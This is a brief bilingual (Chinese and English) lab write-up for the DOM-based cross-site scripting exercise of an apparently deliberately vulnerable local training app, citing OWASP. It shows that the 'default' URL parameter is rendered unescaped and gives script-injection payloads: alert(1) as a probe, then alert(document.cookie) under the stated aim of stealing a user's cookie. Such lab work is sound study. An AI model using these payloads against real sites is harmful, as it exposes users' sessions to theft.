# DOM Based Cross Site Scripting (XSS)

### Objective: Run your own JavaScript in another user's browser, use this to steal the cookie of a logged in user.

### 觀察

可以直接從 URL 塞入任意字串，頁面回傳後直接 render 在表單內，代表我們可以試著塞入 javascript 看看

```html
http://localhost:8086/vulnerabilities/xss_d/?default=English123
```

```html
http://localhost:8086/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
```

## Done
```html
http://localhost:8086/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script>
```

### Ref

### Types of XSS

Types of XSS | OWASP Foundation
[https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29](https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29)
